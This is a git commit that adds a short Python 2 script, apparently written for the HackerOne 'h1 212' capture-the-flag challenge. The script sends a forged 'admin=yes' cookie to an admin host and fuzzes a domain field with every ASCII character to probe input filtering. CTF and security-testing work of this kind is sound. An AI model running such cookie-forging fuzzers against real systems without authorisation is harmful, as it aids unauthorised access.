79b592d96143835a883c497ef80f05e21405e3e6
h45h5h0t <harshant.sharma@gmail.com>
2018-07-09 19:22:23 +0530

    h1 212 adding special character in domain script (unmodified)

---
+++ special_char_test.py
@@ -0,0 +1,25 @@
+#!/usr/bin/env python2
+
+import requests
+import json
+
+url = "http://admin.acme.org/"
+headers = { "Cookie" : "admin=yes", "Content-Type" : "application/json" }
+
+
+# For characters from 0x0 to 0x7f
+for i in xrange(0x7f):
+    # Insert the character in the middle of our domain
+    domain = "212.te{}st.com".format(chr(i))
+
+    # Encode it for JSON
+    data = json.dumps(domain)
+
+    # Create the json object to be sent
+    data = '{{"domain" : {}}}'.format(data)
+
+    # Send our payload
+    response = requests.post(url, data=data, headers=headers)
+
+    # Check the response
+    print repr(domain), response.text
